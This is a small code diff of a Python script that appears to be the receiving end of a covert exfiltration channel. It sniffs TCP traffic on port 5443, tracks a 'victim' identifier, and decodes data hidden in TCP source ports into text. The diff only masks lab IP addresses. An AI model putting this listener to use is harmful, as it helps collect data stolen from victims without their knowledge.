@@ -69,7 +69,7 @@ def read_pcap_file(pcap_file):
     return decimal_list, amount_of_incoming_packets, line_counter - 4, victim_unique_identifier
 
 def receiver_tcp(tcp_ip, tcp_port, echo=True, buffer_size=4096):
-    src_ip = "192.168.30.128"
+    src_ip = "192.168.xx.xxx"
     temp_file_name = "capture.pcap"
     #start sniffer
     pkts = sniff(filter="tcp and dst {} and src {}".format(tcp_ip, src_ip), stop_filter=stopfilter)
@@ -118,7 +118,7 @@ def convert_sourceport_to_string(decimal_list):
 
 def main():
     print("Packet Sniffer Started")
-    dst_ip = "192.168.30.129"
+    dst_ip = "192.168.xx.xxx"
     pcap_file_name = receiver_tcp(dst_ip, 5443)
     decimal_list, expected_amount_of_packets, amount_of_packets_received, victim_unique_identifier = read_pcap_file(pcap_file_name)
     ascii_string = convert_sourceport_to_string(decimal_list)
